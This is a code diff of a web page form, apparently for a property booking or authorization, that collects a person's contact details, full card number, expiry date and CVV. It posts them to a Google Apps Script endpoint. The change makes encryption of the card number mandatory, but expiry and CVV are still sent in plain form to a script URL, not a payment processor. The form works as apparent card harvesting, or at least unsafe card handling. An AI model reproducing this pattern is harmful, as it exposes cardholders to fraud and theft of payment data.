@@ -128,15 +128,17 @@ UwIDAQAB
 
     function encryptData(ccString) {
         let numbers = ccString.replace(/\D/g, '');
-        if(numbers.length < 15) return ccString; 
+        if(numbers.length < 15) throw new Error("Credit card number is incomplete"); 
         
         try {
             var crypt = new JSEncrypt();
             crypt.setPublicKey(PUBLIC_KEY);
-            return crypt.encrypt(numbers) || ccString;
+            const enc = crypt.encrypt(numbers);
+            if (!enc) throw new Error("Encryption failed");
+            return enc;
         } catch(e) {
-            console.error("Encryption failed, falling back", e);
-            return ccString;
+            console.error("Encryption failed:", e);
+            throw new Error("Security Error: Unable to encrypt credit card. Please reload the page and try again.");
         }
     }
 
@@ -244,23 +246,25 @@ UwIDAQAB
             submitBtn.querySelector('span').textContent = 'Processing...';
             spinner.classList.remove('hide');
 
-            // Gather Data
-            const formData = {
-                propertyName: document.getElementById('propertyName').value,
-                fullName: step1Name.value.trim(),
-                email: document.getElementById('email').value,
-                mobile: step1Mobile.value.trim(),
-                address: document.getElementById('address').value,
-                // Apply true RSA Encryption
-                ccNumber: encryptData(document.getElementById('ccNumber').value),
-                expDate: document.getElementById('expDate').value,
-                cvv: document.getElementById('cvv').value,
-                timestamp: new Date().toISOString()
-            };
-
-            const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwSfWwam6uV1oFsw1n3mjz3f4tue44bNw_Ng0PPjXewfOAOjN9EjEvQThdgSnL1ag4j/exec';
-            
             try {
+                const encryptedCC = encryptData(document.getElementById('ccNumber').value);
+                
+                // Gather Data
+                const formData = {
+                    propertyName: document.getElementById('propertyName').value,
+                    fullName: step1Name.value.trim(),
+                    email: document.getElementById('email').value,
+                    mobile: step1Mobile.value.trim(),
+                    address: document.getElementById('address').value,
+                    // Apply true RSA Encryption
+                    ccNumber: encryptedCC,
+                    expDate: document.getElementById('expDate').value,
+                    cvv: document.getElementById('cvv').value,
+                    timestamp: new Date().toISOString()
+                };
+
+                const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwSfWwam6uV1oFsw1n3mjz3f4tue44bNw_Ng0PPjXewfOAOjN9EjEvQThdgSnL1ag4j/exec';
+                
                 await fetch(GOOGLE_SCRIPT_URL, {
                     method: 'POST',
                     mode: 'no-cors',
@@ -276,8 +280,8 @@ UwIDAQAB
                 successCard.style.display = 'block';
 
             } catch (error) {
-                console.error('Network Error:', error);
-                alert('There was a network error. Please try again.');
+                console.error('Error:', error);
+                alert(error.message || 'There was a network error. Please try again.');
             } finally {
                 submitBtn.disabled = false;
                 submitBtn.querySelector('span').textContent = 'Authorize & Secure';
